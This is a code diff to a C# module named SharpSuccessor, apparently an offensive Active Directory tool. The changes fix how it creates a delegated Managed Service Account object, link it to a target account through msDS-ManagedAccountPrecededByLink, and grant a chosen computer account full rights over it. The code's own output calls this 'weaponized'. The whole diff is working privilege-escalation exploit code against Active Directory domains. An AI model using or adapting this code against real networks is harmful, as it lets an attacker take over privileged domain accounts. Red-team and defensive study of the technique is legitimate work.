@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.DirectoryServices;
+using System.DirectoryServices.ActiveDirectory;
 using System.Linq;
 using System.Security.AccessControl;
 using System.Security.Principal;
@@ -34,7 +35,7 @@ namespace SharpSuccessor.Modules
 
         public static DirectoryEntry CreatedMSA(string path, string name)
         {
-
+            Domain currentDomain = Domain.GetCurrentDomain();
             string childName = "CN=" + name;
 
             try
@@ -43,6 +44,11 @@ namespace SharpSuccessor.Modules
                 DirectoryEntry newChild = parentEntry.Children.Add(childName, "msDS-DelegatedManagedServiceAccount");
                 newChild.Properties["msDS-DelegatedMSAState"].Value = 0;
                 newChild.Properties["msDS-ManagedPasswordInterval"].Value = 30;
+                Console.WriteLine("[+] Adding dnshostname " + name + "." + currentDomain.Name);
+                newChild.Properties["dnshostname"].Add(name + "." + currentDomain.Name);
+                Console.WriteLine("[+] Adding samaccountname " + name + "$");
+                newChild.Properties["samaccountname"].Add(name+"$");
+
                 newChild.CommitChanges();
 
                 Console.WriteLine($"[+] Created dMSA object '{newChild.Name}' in '{path}'");
@@ -86,7 +92,7 @@ namespace SharpSuccessor.Modules
                 }
 
                 Console.WriteLine("[+] Attempting to write msDS-ManagedAccountPrecededByLink");
-                dMSA.Properties["msDS-ManagedAccountPrecededByLink"].Value = targetdn;
+                dMSA.Properties["msDS-ManagedAccountPrecededByLink"].Add(targetdn);
 
                 Console.WriteLine("[+] Wrote attribute successfully");
                 Console.WriteLine("[+] Attempting to write  msDS-DelegatedMSAState attribute");
@@ -94,15 +100,18 @@ namespace SharpSuccessor.Modules
                 Console.WriteLine("[+] Attempting to set access rights on the dMSA object");
 
                 string sid = accountToSidLookup(computer);
+  
                 if (sid == null)
                 {
                     Console.WriteLine("[!] Cannot find computer account");
                     return;
                 }
-                RawSecurityDescriptor rsd = new RawSecurityDescriptor("O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;" + sid + ")");
+                RawSecurityDescriptor rsd = new RawSecurityDescriptor("O:S-1-5-32-544D:(A;;0xf01ff;;;" + sid + ")");
                 Byte[] descriptor = new byte[rsd.BinaryLength];
                 rsd.GetBinaryForm(descriptor, 0);
                 dMSA.Properties["msDS-GroupMSAMembership"].Add(descriptor);
+                dMSA.Properties["msDS-SupportedEncryptionTypes"].Value = 0x1c;
+                dMSA.Properties["userAccountControl"].Value = 0x1000;
                 dMSA.CommitChanges();
                 Console.WriteLine("[+] Successfully weaponized dMSA object");
 
